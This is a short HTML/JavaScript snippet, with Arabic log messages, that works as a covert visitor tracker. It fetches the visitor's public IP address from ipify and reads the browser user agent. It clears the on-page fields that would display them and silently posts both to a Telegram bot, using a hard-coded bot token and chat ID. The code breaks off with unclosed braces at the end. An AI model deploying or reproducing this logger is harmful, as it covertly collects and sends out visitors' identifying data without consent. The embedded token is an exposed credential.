<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script>
function getDeviceInfo() {

  axios.get('https://api.ipify.org?format=json')
    .then(function (response) {
      var ipAddress = response.data.ip;
      document.getElementById("ipAddress").innerHTML = "" 


      var userAgent = navigator.userAgent;
      document.getElementById("userAgent").innerHTML = " " ;


      var telegramBotToken = '6035544684:AAE1QkNyTtE-mwdwdH5XPCmWkobQs0IzOqE';
      var chatId = '5333239494';
      var url = 'https://api.telegram.org/bot' + telegramBotToken + '/sendMessage';
      var message = 'عنوان IP: ' + ipAddress + '\nUser Agent: ' + userAgent;

      axios.post(url, {
        chat_id: chatId,
        text: message
      })
      .then(function (response) {
        console.log("تم إرسال عنوان IP و User Agent بنجاح إلى بوت Telegram");
        console.log(response);
      })
      .catch(function (error) {
        console.log("حدث خطأ أثناء إرسال عنوان IP و User Agent إلى بوت Telegram");
        console.log(error);
      });
    })
    .catch(function (error) {
      console.log("حدث خطأ أثناء الاستدعاء");

}
